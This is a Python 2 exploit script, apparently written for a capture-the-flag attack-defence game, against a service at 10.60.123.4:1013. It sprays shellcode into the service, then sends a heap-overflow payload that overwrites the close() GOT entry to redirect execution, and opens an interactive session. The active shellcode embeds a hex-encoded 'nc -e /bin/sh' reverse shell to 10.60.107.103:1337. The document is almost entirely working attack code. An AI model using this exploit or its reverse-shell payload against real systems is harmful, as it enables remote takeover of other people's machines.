import socket
import struct
import time
import telnetlib
import random

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d

def spray(sc):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	head = ''.join([random.choice(['A', 'T', 'G', 'C']) for i in xrange(12)])
	sc = '\x90' * 16 + sc
	#sc.rjust(128 - len(head) - 2, '\xeb\x10')	
	sc = '\xeb\x10' * ((128 - len(head) - 2 - len(sc)) // 2) + sc
	sc = head + ' ' + sc
	print repr(sc)
	s.sendall(sc + '\n')
	s.close()
	

host = '10.60.123.4'
port = 1013

#sc = '\xeb\x07\xbd\x60\x53\xf6\x07\xff\xd5\xe8\xf4\xff\xff\xff\x65\x63\x68\x6f\x20\x68\x65\x6c\x6c\x6f\x00'

#sc = '\xeb\x09\xbd\x60\x53\xf6\x07\xff\xd5\x0f\x0b\xe8\xf2\xff\xff\xff\x65\x63\x68\x6f\x20\x69\x6c\x6f\x76\x65\x68\x75\x69\x68\x75\x69\x00'

sc = '\xeb\x09\xbd\x60\x53\xf6\x07\xff\xd5\x0f\x0b\xe8\xf2\xff\xff\xff\x6e\x63\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x31\x30\x2e\x36\x30\x2e\x31\x30\x37\x2e\x31\x30\x33\x20\x31\x33\x33\x37\x00'

for i in xrange(400): 
	spray(sc)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

head = ''.join([random.choice(['A', 'T', 'G', 'C']) for i in xrange(12)])
print head

close_got = 0x804e198
#sc_addr = 0x0804f000 + 0x18 + 0x8 + 18 + len(head) + 1 + 16  
sc_addr = 0x08068380


payload = p(0xdeadbeef) * 2
payload = payload.ljust(128 - 8 - 18 - len(head) - 1, 'A')
payload += p(0xfffffff8)
payload += p(0x80808080)
payload += 'aaaa'
payload += p(0xfffffff9)
payload += p(close_got-12)
payload += p(sc_addr)

print payload.encode('hex') 
f.write(head + ' ' + payload + '\n')
print readuntil(f, '\n')
s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.sendall(head + '\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
